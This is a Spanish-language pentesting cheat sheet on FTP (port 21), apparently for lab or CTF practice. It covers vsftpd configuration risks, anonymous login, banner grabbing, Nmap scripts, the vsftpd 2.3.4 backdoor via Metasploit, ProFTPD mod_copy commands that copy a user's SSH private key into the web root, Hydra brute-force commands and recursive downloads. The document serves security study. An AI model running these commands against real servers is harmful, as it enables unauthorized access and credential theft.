---
title: FTP (File Transfer Protocol - Puerto 21)
pubDate: '2026-08-26'
---

## ¿Qué es FTP?
**FTP (File Transfer Protocol)** es un protocolo clásico utilizado para la transferencia de archivos entre un cliente y un servidor. Aunque existen versiones seguras (SFTP/FTPS), el puerto 21 suele ejecutar la versión original, que transmite los datos y las credenciales en **texto claro**.

### Riesgos principales
1. **Acceso Anónimo:** Muchas configuraciones permiten entrar con el usuario `anonymous`, exponiendo archivos sensibles.
2. **Texto Claro:** Un atacante en la misma red (Man-in-the-Middle) puede capturar usuarios y contraseñas fácilmente.
3. **Vulnerabilidades de Software:** Versiones antiguas (ej: vsftpd 2.3.4) tienen backdoors o fallos de ejecución remota (RCE).
4. **Enumeración de Archivos:** Permite mapear la estructura de archivos del servidor, lo que ayuda a planificar otros ataques.

---

## ⚙️ Ficheros de Configuración y Directivas Críticas

### Rutas Clave en Linux
* **vsFTPd:** `/etc/vsftpd.conf`
* **Usuarios deshabilitados:** `/etc/ftpusers`

### Directivas Críticas en `vsftpd.conf`
| Directiva | Descripción e Impacto de Seguridad |
| :--- | :--- |
| `anonymous_enable=YES` | ¿Permite el inicio de sesión con el usuario anónimo? |
| `anon_upload_enable=YES` | ¿Permite a los usuarios anónimos subir archivos? (Riesgo de subida de WebShells) |
| `anon_mkdir_write_enable=YES` | ¿Permite a usuarios anónimos crear nuevos directorios? |
| `no_anon_password=YES` | ¿No solicita ninguna contraseña a los usuarios anónimos? |
| `anon_root=/home/username/ftp` | Define la ruta raíz accesible para la sesión anónima. |
| `write_enable=YES` | Permite el uso de comandos de escritura: `STOR`, `DELE`, `RNFR`, `RNTO`, `MKD`, `RMD`, `APPE` y `SITE`. |

---

## 🔎 Enumeración y Acceso Inicial

### 1. Acceso Anónimo (Lo primero a probar)
Muchos servidores permiten entrar con el usuario `anonymous` y cualquier contraseña (o vacía).
```bash
# Manual
ftp <IP>
> Name: anonymous
> Password: (vacío o anonymous)

# Nmap automático
nmap -p 21 --script ftp-anon <IP>
```

### 2. Banner Grabbing e Interacción
Identifica la versión exacta para buscar exploits específicos (ej: *vsftpd 2.3.4* o *ProFTPD 1.3.3c*).
```bash
# Conexión directa
nc -nv <IP> 21
telnet <IP> 21
ftp <IP> 21

# Conexión Cifrada SSL/TLS (STARTTLS)
openssl s_client -connect <IP>:21 -starttls ftp
```

### 3. Scripts NSE de Nmap para FTP
```bash
nmap -p 21 --script=ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor,ftp-proftpd-backdoor,ftp-libopie,ftp-vuln-cve2010-4221,ftp-brute <TARGET_IP>
```

---

## 🚀 Vectores de Explotación

### vsftpd 2.3.4 (Backdoor ":)")
Si ves esta versión exacta, es vulnerable a un backdoor histórico. Al intentar un login con un usuario que contenga `:)`, se abre una shell en el puerto **6200**.
```bash
# Metasploit
use exploit/unix/ftp/vsftpd_234_backdoor
```

### ProFTPD 1.3.5 (Exploit mod_copy)
Permite copiar archivos de una ruta a otra del servidor sin estar autenticado. Útil para mover archivos sensibles a carpetas web públicas.
```bash
# Ejemplo: Copiar la llave privada de un usuario
ftp <IP>
> SITE CPFR /home/usuario/.ssh/id_rsa
> SITE CPTO /var/www/html/id_rsa
```

---

## 🔑 Fuerza Bruta (Hydra)
```bash
# Con un usuario conocido
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<IP>

# Con listas de usuarios y contraseñas
hydra -L users.txt -P passwords.txt ftp://<IP> -t 4
```

---

## 📂 Transferencia de Archivos y Tips

```bash
# Descarga recursiva de todo el servidor (Anonymous)
wget -r ftp://anonymous:anonymous@<IP>/

# Tips dentro del cliente FTP interactivo:
ls -la       # Listar todos los ficheros, incluyendo ocultos (.ssh, .bashrc, etc.)
binary       # Activa modo binario (Evita que se corrompan archivos .exe, .zip o imágenes)
passive      # Útil si el comando 'ls' no responde debido a un firewall
prompt       # Desactiva la pregunta de "confirmar descarga" en cada archivo (para mget)
mget *       # Descarga todo el contenido del directorio actual
```
